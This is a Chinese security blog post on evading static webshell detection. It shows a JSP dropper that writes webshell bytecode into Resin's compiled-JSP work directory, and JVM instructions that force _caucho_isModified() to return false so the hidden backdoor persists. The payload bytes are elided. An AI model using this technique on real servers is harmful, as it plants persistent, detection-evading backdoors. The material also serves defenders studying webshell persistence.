---
layout: post
title: 利用Java Binary Webshell对抗静态检测
description: "Java Webshell Hidden in JSP Pages"
tags: [java,webshell,servlet]
image:
  background: triangular.png
---

## 0x01 背景

Webshell一般是指以服务端动态脚本形式存在的一种网页后门。在入侵检测的过程中，检测Webshell无疑是一大重点。比较常见的检测手法有：

1. 文件内容检测（静态检测）
2. 文件行为检测（动态检测）
3. 网络异常流量分析
4. ......

其中，静态检测是比较简单有效的检测Webshell的手段之一。根据Webshell的文件特征建立异常模型，并使用大量的Webshell样本对模型进行训练，通过诸如异常函数、关键代码以及文件内容与普通业务代码的相似度等等关键点来进行分析检测。

然而在笔者工作中却发现，如果Webshell脱离了服务端脚本页面形式的存在，基于文件特征的静态检测又将面临怎样的困境？我们不妨一起来看看。

## 0x02 JavaWeb应用

在Java Web应用中，Servlet是Java语言实现的一个接口，用于编写服务端程序[^1]。Servlet程序代码会预先编译成.class文件，部署在Java容器中，响应用户各种协议的请求，大多数情况下基于HTTP协议，包括动态生成网页内容等等。但是Servlet由Java代码编写，不能有效地区分页面的展示和处理逻辑，导致Servlet代码非常混乱，而用Java服务器页面（JSP）的出现，可以让程序员把展现层和数据层很好的区分管理起来。
    
JSP作为HttpServlet的扩展，使用HTML的书写格式，在适当的地方加入Java代码片段，从而动态生成页面内容。JSP在首次被访问时，JSP应用容器(应用服务器中用于管理Java组件的部分)将其转换为Java Servlet代码，并编译成.class字节码文件并执行。而下次该JSP文件被访问时，服务器将直接调用Servlet进行处理，除非JSP文件被修改。

比如，在Apache Tomcat中，它提供了一个Jasper编译器用以将JSP编译成对应的Servlet。在JSP文件被访问后，在workDir生成对应的servlet源码与编译后的.class字节码文件。

![tomcat-work-dir]({{ site.url }}/images/articles/201605/tomcat-work-dir.png)

JSP编译生成的.class文件默认存放在`$CATALINA_BASE/work`下，存放路径也可以通过Server.xml等配置文件中的Host标签的workDir属性进行配置[^2]：

{% highlight xml %} 
<Host appBase="webapps" autoDeploy="true" name="localhost" unpackWARs="true" 
    workDir="/home/tomcat_run_user/other_work_dir">

....

</Host>
{% endhighlight%}   

**JSP文件再次被访问时，Tomcat会直接调用已编译好的字节码文件。当文件被修改，Tomcat会重新解析JSP文件，生成Servlet代码并编译执行。当文件被删除时，Tomcat返回`404 Not Found`。**

![tomcat-404]({{ site.url }}/images/articles/201605/tomcat-404.png)

而在在配置文件`$CATALINA_BASE/conf/web.xml`中，当Jasper运行在开发模式下时，我们可以配置modificationTestInterval参数，控制Tomcat在一定时间之内不检查JSP文件的修改状态[^3]。

设想，如果可以关闭Java容器对JSP文件修改状态的检查，是否可以将恶意代码存放在workDir的.class字节码中，并通过JSP形式持久访问？

## 0x03 Resin

我们注意到了另一款非常流行且性能优良的企业级应用服务器——Resin。Resin同样提供了Servlet和JSP运行引擎。

可以看到默认情况下，初次访问JSP后，Resin会在./WEB-INF/work/_jsp目录下生成Servlet源码和编译后的.class字节码文件。

{% highlight bash %}
└── webapps
    └── ROOT
        ├── index.jsp
        └── WEB-INF
            ├── classes
            ├── tmp
            ├── web.xml
            └── work
                └── _jsp
                    ├── _index__jsp.class
                    ├── _index__jsp.java
                    ├── _index__jsp.java.smap
                    └── _index__jsp$TagState.class


{% endhighlight %}


与Apache Tomcat不同的是，**Resin生成并编译Servlet之后，可以在JSP文件被删除的情况下，正常提供访问。**
查看Resin生成的JSP对应的Servlet源码发现，生成的代码内包含了检查JSP文件修改状态相关方法：`_caucho_isModified()`。

我们来看看这部分源码中的关键逻辑:

{% highlight java %}
public class _index__jsp extends com.caucho.jsp.JavaPage
{
  private boolean _caucho_isDead;
  private boolean _caucho_isNotModified;

  protected void _caucho_setNeverModified(boolean isNotModified)
  {
    _caucho_isNotModified = true;
  }

  public boolean _caucho_isModified()
  {
    if (_caucho_isDead)
      return true;

    if (_caucho_isNotModified)
      return false;

    if (com.caucho.server.util.CauchoSystem.getVersionId() != -8002497470487589159L)
      return true;

    return _caucho_depends.isModified();
  }

    public void init(com.caucho.vfs.Path appDir)
    throws javax.servlet.ServletException
  {
    ...
    depend = new com.caucho.vfs.Depend(appDir.lookup("index.jsp"), -122100326514986033L, false);
    _caucho_depends.add(depend);
    loader.addDependency(depend);
  }

    public void destroy()
  {
      _caucho_isDead = true;
      super.destroy();
    ...
  }

  ...
}

{% endhighlight %}

Servlet启动时，Resin会调用init()方法，结束时会调用destroy()方法[^4]。init()方法中实例化的Depend类用于检查文件修改，
这里调用的Depend构造函数中，第三个参数标志了在JSP文件被删除的情况下的处理逻辑。

`public Depend(Path source, long digest, boolean requireSource)`

requireSource为True时，如果JSP文件被删除则服务器返回404。默认为false，所以当已编译的JSP文件被删除时，Resin并不会判定该JSP页面被修改，依然会执行对应的字节码。

可以看到，Resin判断一个JSP文件是否修改的逻辑为

![is_modified]({{ site.url }}/images/articles/201605/is_modified.png)

当web.xml中配置autoCompile属性为false时，Resin会关闭对JSP文件的自动编译，调用_caucho_setNeverModified()方法，从而不会检查JSP文件修改状态。

web.xml
{% highlight xml%}
<web-app>
        <jsp auto-compile="false"></jsp>
</web-app>
{% endhighlight %}

## 0x04 Binary JSP Webshell

由于Resin这些特性，我们可以用JSP将Webshell字节码写入对应的路径下，即可得到一个二进制形式存在的JSP Webshell。这个Resin自动编译存放的代码目录路径可以通过`<work-dir>`标签自定义配置，默认为`WEB-INF/work`目录[^5]。如：

{% highlight xml %}
{% raw %}
<host id="test.com.cn">
<web-app id="/">
<app-dir>pathto\test</app-dir>
<work-dir>pathto\WEB-INF\work_sc</work-dir>
<temp-dir>pathto\WEB-INF\tmp_sc</temp-dir>
......
</web-app> 
</host>
{% endraw %}
{% endhighlight %}

如：默认配置下，利用JSP写入二进制字节码Webshell：
{% highlight java %}

    <%@ page import="java.io.*" %>
    <%
    FileOutputStream file_out=new FileOutputStream("./webapps/ROOT/WEB-INF/work/_jsp/_comm__jsp.class");   
    FileOutputStream file_out_tag=new FileOutputStream("./webapps/ROOT/WEB-INF/work/_jsp/_comm__jsp$TagState.class");  

    byte[] _jsp_class = {(byte)0xca,(byte)0xfe,(byte)0xba,......};
    byte[] _jsp_tag_class = {(byte)0xca,(byte)0xfe,(byte)0xba,(byte)0xbe,......};

    file_out.write(_jsp_class,0,_jsp_class.length);
    file_out_tag.write(_jsp_tag_class,0,_jsp_tag_class.length);

    file_out.close();
    file_out_tag.close();

    %>

{% endhighlight %}

利用脚本中Webshell的字节码内容可以在本地Resin服务器环境中编译获得，但是由于编译和运行的Resin版本不一致会被判定JSP文件已修改，从而被重新编译，这不是我们想看到的。如0x03小节中所说，Resin中判断JSP是否修改的逻辑包含在JSP对应的Servlet代码中，于是我们可以篡改这部分字节码中的逻辑，使得`_caucho_isModified()`函数永远返回false，JVM指令如下：

{% highlight jvm %}
aload_0
getfield _jsp/_comm__jsp/_caucho_isDead Z
ifeq 6
iconst_0
ireturn
aload_0
getfield _jsp/_comm__jsp/_caucho_isNotModified Z
ifeq 11
iconst_0
ireturn
invokestatic com/caucho/server/util/CauchoSystem/getVersionId()J
ldc2_w 431137076814425723
lcmp
ifeq 17
iconst_0
ireturn
aload_0
getfield _jsp/_comm__jsp/_caucho_depends Lcom/caucho/make/DependencyContainer;
iconst_0
ireturn
{% endhighlight %}

测试效果如下：利用write_binary_shell.jsp文件，将字节码webshell写入对应的目录下，即可通过访问对应的JSP文件来访问Webshell。
由于篡改了相关的判断逻辑，无论Web是否存在同名JSP文件，Resin依然会优先解析到该字节码Webshell。

{% highlight bash %}
├── webapps
│   └── ROOT
│       ├── index.jsp
│       ├── WEB-INF
│       │   ├── classes
│       │   ├── tmp
│       │   ├── web.xml
│       │   └── work
│       │       └── _jsp
│       │           ├── _comm__jsp.class
│       │           └── _comm__jsp$TagState.class
│       └── write_binary_shell.jsp
{% endhighlight %}

![poc]({{ site.url }}/images/articles/201605/poc.png)

## 0x05 References

[^1]:https://zh.wikipedia.org/wiki/Java_Servlet
[^2]:https://tomcat.apache.org/tomcat-8.0-doc/config/host.html
[^3]:https://tomcat.apache.org/tomcat-8.0-doc/jasper-howto.html
[^4]:http://www.caucho.com/resin-3.1/doc/servlet.xtp
[^5]:http://www.caucho.com/resin-4.0/admin/config-el-ref.xtp#work-dir













